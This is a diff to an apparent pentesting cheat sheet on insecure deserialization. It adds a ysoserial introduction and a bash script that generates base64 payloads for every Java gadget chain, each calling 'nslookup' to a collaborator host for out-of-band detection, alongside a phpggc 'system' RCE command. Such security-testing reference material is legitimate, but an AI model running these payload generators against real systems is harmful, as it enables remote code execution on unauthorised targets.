@@ -79,7 +79,16 @@ phpggc -b "{{ gadget-chain Symfony/RCE4 }}" "system" "{{ payload id }}" | clip.e
 
 ## Java
 
+Insecure deserializations are quite common on Java.
+The most common tool to abuse this vulnerability is [ysoserial](https://github.com/frohoff/ysoserial).
+
 ### Ysoserial
+
+As stated on its GitHub:
+
+> A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+
+![ysoserial](ysoserial.png)
 
 #### Installation
 
@@ -148,7 +157,7 @@ The objects will likely be sent on base64 or similar formats instad of using the
 <template v-slot:docker>
 
 ```bash
-docker run -it ysoserial "{{ gadget-chain CommonsCollections1 }}" "{{ payload nslookup your.burpcollaborator.net }}" | base64 -w 0
+docker run ysoserial "{{ gadget-chain CommonsCollections1 }}" "{{ payload nslookup your.burpcollaborator.net }}" | base64 -w 0
 ```
 
 </template>
@@ -163,7 +172,37 @@ java -jar ysoserial.jar "{{ gadget-chain CommonsCollections1 }}" "{{ payload nsl
 
 You will likely want to test a bunch of gadget chains with Burp's intruder or a script. The following script will help you to create a list with a sample of every serializated exploit:
 
-> TODO: Finish implementing the script
+
+```bash[ysoserial.sh]
+#!/usr/bin/env bash
+
+# Usage ./ysoserial.sh your.collaborator.net
+# If YSOSERIAL_OPTIONAL_PATH file exists uses java -jar instead of docker
+YSOSERIAL_CMD="docker run --rm {{ ysoserial-image ysoserial }}"
+YSOSERIAL_OPTIONAL_PATH="{{ ysoserial-jar ./ysoserial.jar }}"
+
+
+if test -f "$YSOSERIAL_OPTIONAL_PATH"; then
+    YSOSERIAL_CMD="java -jar $YSOSERIAL_OPTIONAL_PATH"
+    GADGET_CHAINS=$($YSOSERIAL_CMD | tail -n +8 | sed -e 's/^[[:space:]]*\([a-zA-Z0-9]*\).*/\1/')
+else
+    # When listing the gadget chains requires -t
+    GADGET_CHAINS=$(docker run --rm -it {{ ysoserial-image ysoserial }} | tail -n +8 | sed -e 's/^[[:space:]]\+\([a-zA-Z0-9]\+\).\+$/\1/')
+fi
+
+for CHAIN in $GADGET_CHAINS; do
+    PAYLOAD=$($YSOSERIAL_CMD "$CHAIN" "{{ oob-command nslookup }} $CHAIN.$1" 2> /dev/null | base64 -w 0)
+    if [ -n "$PAYLOAD" ]; then
+        echo "$PAYLOAD"
+    fi
+done
+```
+
+You can use it as follows:
+
+```bash
+./ysoserial.sh {{ collaborator your.collaborator.net }}
+```
 
 ### Using custom gadget chains
 
